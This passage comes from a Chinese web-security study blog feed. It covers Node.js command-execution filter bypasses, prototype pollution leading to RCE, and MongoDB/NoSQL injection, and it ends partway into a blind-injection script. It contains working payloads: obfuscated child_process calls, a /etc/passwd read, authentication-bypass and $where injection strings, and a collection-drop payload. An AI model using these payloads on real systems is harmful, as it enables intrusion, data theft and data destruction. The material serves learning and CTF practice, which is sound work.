function_">log</span>(data);&#125;);</span><br></pre></td></tr></table></figure><ol><li>readFile()</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>写</strong></li></ul><ol><li>writeFileSync()</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;sss&#x27;</span>);</span><br></pre></td></tr></table></figure><ol><li>writeFile()</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFile</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;&#125;)</span><br></pre></td></tr></table></figure><h3 id="RCE-bypass"><a href="#RCE-bypass" class="headerlink" title="RCE bypass"></a><strong>RCE bypass</strong></h3><p><strong>原型：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>字符拼接：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2b<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)<span class="comment">//(%2b就是+的url编码)require(&#x27;child_process&#x27;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)</span></span><br></pre></td></tr></table></figure><ul><li>编码绕过：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;</span>](<span class="string">&#x27;cat fl001g.txt&#x27;</span>)<span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()) <span class="comment">//弹计算器</span></span><br></pre></td></tr></table></figure><ul><li>模板拼接：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;open /System/Applications/Calculator.app/&#x27;</span>）</span><br></pre></td></tr></table></figure><ul><li>其他函数：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;/bin/sleep&quot;</span>,[<span class="string">&quot;3&quot;</span>]); *<span class="comment">//调用某个可执行文件，在第二个参数传args* require(&quot;child_process&quot;).spawn(&#x27;sleep&#x27;, [&#x27;3&#x27;]); </span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFileSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-Nodejs原型链污染</title>
      <link href="/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>漏洞点:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="comment">// 如果target与source有相同的键名，则让target的键值为source的键值</span></span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果target与source没有相同的键名，则直接在target新建键名并赋给键值</span></span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123; &quot;a&quot;: 1, &quot;__proto__&quot;: &#123; &quot;b&quot;: 2&#125; &#125;&#x27;</span>);</span><br><span class="line"><span class="title function_">merge</span>(o1, o2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o3 = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>);</span><br></pre></td></tr></table></figure><h2 id="1-prototype原型"><a href="#1-prototype原型" class="headerlink" title="1.prototype原型"></a>1.prototype原型</h2><p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 proto ）指向它的构造函数的原型对象（prototype）。该原型对象也有一个自己的原型对象（<code>__proto__</code>），层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。<br>几乎所有 JavaScript 中的对象都是位于原型链顶端的 Object 的实例。<br>尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params">name,age</span>)&#123;<span class="variable language_">this</span>.<span class="property">name</span>=name;<span class="variable language_">this</span>.<span class="property">age</span>=age;&#125;<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;I&#x27;m &quot;</span>+<span class="variable language_">this</span>.<span class="property">name</span>+<span class="string">&quot; And I&#x27;m &quot;</span>+<span class="variable language_">this</span>.<span class="property">age</span>);&#125;<span class="keyword">var</span> fn=<span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="string">&#x27;xiaoming&#x27;</span>,<span class="number">19</span>);</span><br><span class="line">fn.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fn.<span class="property">toString</span>===<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">proto</span>.<span class="property">toString</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fn.<span class="property">proto</span>===<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">proto</span>===<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">proto</span>===<span class="literal">null</span>)</span><br></pre></td></tr></table></figure><p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/image-20220307155913395.png" alt="图片"></p><h2 id="2-原型链污染原理"><a href="#2-原型链污染原理" class="headerlink" title="2.原型链污染原理"></a>2.原型链污染原理</h2><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象let foo = &#123;bar: 1&#125;// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)<span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">proto</span>.<span class="property">bar</span> = <span class="number">2</span><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)<span class="comment">// 此时再用Object创建一个空的zoo对象let zoo = &#123;&#125;// 查看zoo.bar，此时bar为2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure><h2 id="3-原型链污染配合RCE"><a href="#3-原型链污染配合RCE" class="headerlink" title="3.原型链污染配合RCE"></a>3.原型链污染配合RCE</h2><p>有原型链污染的前提之下，我们可以控制基类的成员，赋值为一串恶意代码，从而造成代码注入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line">foo.<span class="property">proto</span>.<span class="property">bar</span> = <span class="string">&#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;open /System/Applications/Calculator.app/\&#x27;);&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)<span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(zoo.<span class="property">bar</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新周记5</title>
      <link href="/2024/02/29/%E5%91%A8%E8%AE%B0-2024-02-29-%E6%96%B0%E5%91%A8%E8%AE%B05/"/>
      <url>/2024/02/29/%E5%91%A8%E8%AE%B0-2024-02-29-%E6%96%B0%E5%91%A8%E8%AE%B05/</url>
      
        <content type="html"><![CDATA[<p>总结:<br><a href="https://hades-blog.github.io/2024/02/28/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-NoSql%E6%B3%A8%E5%85%A5/">https://hades-blog.github.io/2024/02/28/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-NoSql%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://hades-blog.github.io/2024/02/28/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://hades-blog.github.io/2024/02/28/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p><p>马上打算开始学java漏洞,平常没事刷点ctf题练练手,总结总结wp,周末研究挖洞思路并且总结流程</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-Java安全</title>
      <link href="/2024/02/29/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Java%E5%AE%89%E5%85%A8/"/>
      <url>/2024/02/29/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Java%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>对于Java安全,其中的内容实在太多,此部分的总结和后续的更新会全程在飞书知识库编写:<br><a href="https://eihev6cyr3j.feishu.cn/wiki/FcHewnSP5iH7HgkE4iEccA3enug?fromScene=spaceOverview">https://eihev6cyr3j.feishu.cn/wiki/FcHewnSP5iH7HgkE4iEccA3enug?fromScene=spaceOverview</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-NoSQL注入</title>
      <link href="/2024/02/28/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-NoSql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/02/28/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-NoSql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>详解:<a href="https://xz.aliyun.com/t/9908?time__1311=n4+xuDgD9Am4BlDRDBqDqpDU2fom5G8iQDAxrbD#toc-4">https://xz.aliyun.com/t/9908?time__1311=n4+xuDgD9Am4BlDRDBqDqpDU2fom5G8iQDAxrbD#toc-4</a></p><h2 id="1-NoSQL"><a href="#1-NoSQL" class="headerlink" title="1.NoSQL"></a>1.NoSQL</h2><p>NoSQL（Not Only SQL）是一种非关系型数据库,它与传统的关系型数据库（如MySQL、Oracle）相比具有不同的数据存储模型和查询语言。</p><p>常见的NoSQL数据库包括 MongoDB（文档型）、Redis（键值型）、Cassandra（列族型）、Neo4j（图形型）等。</p><p>我们从MongDB中学习NoSQL注入</p><h2 id="2-MongoDB"><a href="#2-MongoDB" class="headerlink" title="2.MongoDB"></a>2.MongoDB</h2><p>MongoDB 将数据存储为一个文档，数据结构由键值（key&#x3D;&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><h3 id="MongoDB基础"><a href="#MongoDB基础" class="headerlink" title="MongoDB基础"></a>MongoDB基础</h3><table><thead><tr><th align="center">SQL概念</th><th align="center">MongoDB概念</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">database</td><td align="center">database</td><td align="center">数据库</td></tr><tr><td align="center">table</td><td align="center">collection</td><td align="center">数据库表&#x2F;集合</td></tr><tr><td align="center">row</td><td align="center">document</td><td align="center">数据记录行&#x2F;文档</td></tr><tr><td align="center">column</td><td align="center">field</td><td align="center">数据字段&#x2F;域</td></tr><tr><td align="center">index</td><td align="center">index</td><td align="center">索引</td></tr><tr><td align="center">table joins</td><td align="center"></td><td align="center">表连接，MongoDB 不支持</td></tr><tr><td align="center">primary key</td><td align="center">primary key</td><td align="center">主键，MongoDB 自动将 _id 字段设置为主键</td></tr></tbody></table><ul><li>数据库</li></ul><p>一个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show dbs</span></span><br><span class="line">admin   0.078GB</span><br><span class="line">config  0.078GB</span><br><span class="line">local   0.078GB</span><br></pre></td></tr></table></figure><ul><li>文档</li></ul><p>文档是一组键值（key-value）对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;whoami&quot;, &quot;age&quot;:19&#125;</span><br></pre></td></tr></table></figure><ul><li>集合</li></ul><p>集合就是 MongoDB 文档组,存在于数据库中，没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p><p>比如，我们可以将以下不同数据结构的文档插入到集合中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;whoami&quot;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;bunny&quot;, &quot;age&quot;:19&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;bob&quot;, &quot;age&quot;:20, &quot;groups&quot;:[&quot;admins&quot;,&quot;users&quot;]&#125;</span><br></pre></td></tr></table></figure><p>当插入一个文档时，集合就会被自动创建,可以使用<code>show collections</code>或<code>show tables</code>命令查看已有集合：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show collections</span></span><br><span class="line">all_users</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show tables</span></span><br><span class="line">all_users</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MongoDB语法"><a href="#MongoDB语法" class="headerlink" title="MongoDB语法"></a>MongoDB语法</h3><ul><li>创建数据库，若存在则连接并切换到指定数据库:<br>  <code>use DATABASE_NAME</code>  <br></li><li>使用 createCollection() 方法来创建集合:<br>  <code>db.createCollection(name, options)</code>,其中<br>  name：要创建的集合名称<br>  options：可选参数，指定有关内存大小及索引的选项  <br></li><li>使用 insert() 方法向集合中插入文档:<br>  <code>db.COLLECTION_NAME.insert(document)</code>  <br></li><li>使用 update() 或 save() 方法来更新集合中的文档(这里不细讲了)  <br></li><li>使用 find() 方法来查询文档(可以传入多个键值对),pretty()方法以格式化的方式来显示所有文档：<br>  <code>db.collection.find(query, projection).pretty()</code>,其中<br>  query：可选，使用查询操作符指定查询条件，相当于 sql select 语句中的 where 子句。<br>  projection：可选，使用投影操作符指定返回的键。</li></ul><p>例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.all_users.find(&#123;&quot;age&quot;:20&#125;).pretty()</span><br><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : 20,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><ul><li>条件语句查询:</li></ul><table><thead><tr><th align="center">操作</th><th align="center">格式</th><th align="center">范例</th><th align="center">RDBMS中的类似语句</th></tr></thead><tbody><tr><td align="center">等于</td><td align="center"><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td><td align="center"><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td><td align="center">where name &#x3D; ‘whoami’</td></tr><tr><td align="center">小于</td><td align="center"><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td><td align="center"><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td><td align="center">where age &lt; 19</td></tr><tr><td align="center">小于或等于</td><td align="center"><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td><td align="center"><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td><td align="center">where likes &lt;&#x3D; 19</td></tr><tr><td align="center">大于</td><td align="center"><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td><td align="center"><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td><td align="center">where likes &gt; 19</td></tr><tr><td align="center">大于或等于</td><td align="center"><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td><td align="center"><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td><td align="center">where likes &gt;&#x3D; 19</td></tr><tr><td align="center">不等于</td><td align="center"><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td><td align="center"><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td><td align="center">where likes !&#x3D; 19</td></tr></tbody></table><h2 id="2-PHP中的MongoDB注入"><a href="#2-PHP中的MongoDB注入" class="headerlink" title="2.PHP中的MongoDB注入"></a>2.PHP中的MongoDB注入</h2><h3 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h3><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p><p>例如后台通过账户密码参数查询数据库中的信息</p><p>利用PHP特性和<code>$ne</code>关键词构造:<code>username[$ne]=1&amp;password[$ne]=1</code></p><p>以此向服务器提交两个参数：username和password,查询两个参数的值不等于1的数据,这样导致后台会将所有数据都查询出</p><p><img src="https://s2.loli.net/2024/02/28/mGqMHY7ZuQstV6E.png" alt="image.png"></p><p>一些payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]= &amp;password[$ne]=</span><br><span class="line">username[$gt]= &amp;password[$gt]=</span><br><span class="line">username[$gte]= &amp;password[$gte]=</span><br></pre></td></tr></table></figure><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p><p>如下实例，假设后端的 MongoDB 查询语句使用了字符串拼接：</p><p><code>string query =&quot;&#123; username: &#39;&quot; + $username + &quot;&#39;, password: &#39;&quot; + $password + &quot;&#39; &#125;&quot;</code></p><p>如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：</p><p><code>username=admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;: &#39;a&amp;password=&#39; &#125;], $comment: &#39;123456</code></p><p>此时，只要用户名是正确的，这个查询就可以成功。</p><p><strong>但是</strong>现在无论是 PHP 的 MongoDB Driver 还是 Nodejs 的 Mongoose 都必须要求查询条件必须是一个数组或者 Query 对象了，因此这用注入方法简单了解一下就好了。</p><h3 id="js注入"><a href="#js注入" class="headerlink" title="js注入"></a>js注入</h3><p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p><p>若后端利用了<code>$where</code>操作符(能将后面的js代码执行),并将用户输入的内容插入其中结合js代码一起去执行,就可能造成js注入</p><ul><li>MongoDB 2.4 之前</li></ul><p>可以通过自定义JavaScript函数来获取数据库的所有信息。发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：</p><p><code>username=1&amp;password=1&#39;;(function()&#123;return(tojson(db.getCollectionNames()))&#125;)();var a=&#39;1</code></p><ul><li>MongoDB 2.4 之后</li></ul><p>MongoDB 2.4 之后 db 属性访问不到了，但我们依然可以构造万能密码。如果此时我们发送以下这几种数据,也可以造成js注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1&#x27;;return true//</span><br><span class="line">或</span><br><span class="line">username=1&amp;password=1&#x27;;return true;var a=&#x27;1</span><br></pre></td></tr></table></figure><ul><li>使用<code>Command</code>方法造成的注入</li></ul><p>在 MongoDB 的服务器端可以通过 db.eval 方法来执行 JavaScript 脚本，如我们可以定义一个 JavaScript 函数，然后通过 db.eval 在服务器端来运行。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;&#125;);db.users.drop();db.user.find(&#123;&#x27;username&#x27;:&#x27;1</span><br><span class="line">username=1&#x27;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:123456&quot;&#125;);db.users.find(&#123;&#x27;username&#x27;:&#x27;1</span><br></pre></td></tr></table></figure><p>则将改变原本的查询语句造成注入。</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>当页面没有回显时，那么我们可以通过<code>$regex</code>正则表达式来达到和传统SQL注入中<code>substr()</code>函数相同的功能，而且NoSQL用到的基本上都是布尔盲注。</p><p>如下所示，在已知一个用户名的情况下判断密码的长度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[$regex]=.&#123;4&#125;    // 登录成功</span><br><span class="line">username=admin&amp;password[$regex]=.&#123;5&#125;    // 登录成功</span><br><span class="line">username=admin&amp;password[$regex]=.&#123;6&#125;    // 登录成功</span><br><span class="line">username=admin&amp;password[$regex]=.&#123;7&#125;    // 登录失败</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">//说明密码长度为7</span><br></pre></td></tr></table></figure><p>MongoDB盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 